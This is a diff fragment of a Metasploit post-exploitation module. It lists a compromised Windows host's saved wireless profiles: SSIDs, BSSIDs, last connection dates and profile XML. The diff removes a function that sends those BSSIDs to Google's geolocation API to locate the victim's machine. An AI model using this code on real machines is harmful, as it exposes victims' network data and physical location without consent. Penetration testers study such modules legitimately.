@@ -59,11 +59,9 @@ class Metasploit3 < Msf::Post
 			profile['date']= last_Connect(profile['ssid'])
 			print_status("Found Net: #{profile['ssid']}, #{profile['bssid']}, Connected Last: #{profile['date']}")
 			survey = "&wifi=mac:#{profile['bssid']}%7Cssid:#{profile['ssid']}%7Css:-100"
-			pos = wlan_triangulate(survey)
-            
+			pos = wlan_triangulate(survey)            
 			comment = "Net: #{profile['ssid']}, #{profile['bssid']}, Connected Last: #{profile['date']} @ Host: #{session.session_host}"
-			report_results(pos,"msf_preferrednets",comment)
-                
+			report_results(pos,"msf_preferrednets",comment)                
 			wlan_info << " Profile Name: #{profile['name']}\n"
 			wlan_info  << profile['xml']
 			end
@@ -276,23 +274,4 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-	def wlan_triangulate(survey)
-		c = Rex::Proto::Http::Client.new("maps.googleapis.com",443,{},true)
-		uri = "/maps/api/browserlocation/json?browser=firefox&sensor=true#{survey}"
-		r = c.request_raw('uri'=>uri)
-		resp=c.send_recv(r)
-		res=resp.body     
-		if res =~ /(accuracy(.)+.,)/
-			acc = $1.sub("accuracy\" :","").chomp(",").gsub!(/\s+/, "")
-		end
-		if res =~ /(lat(.)+.,)/
-			lat = $1.sub("lat\" :","").chomp(",").gsub!(/\s+/, "")
-		end        
-		if res =~ /(lng(.)+.)/
-			lon = $1.sub("lng\" :","").gsub!(/\s+/, "")
-		end
-		pos = Position.new(lat,lon,acc)
-		print_status("Google Triangulated Position:  lat: #{pos.lat}, lon: #{pos.lon}, acc: #{pos.acc}")
-		return pos
-	end
 end
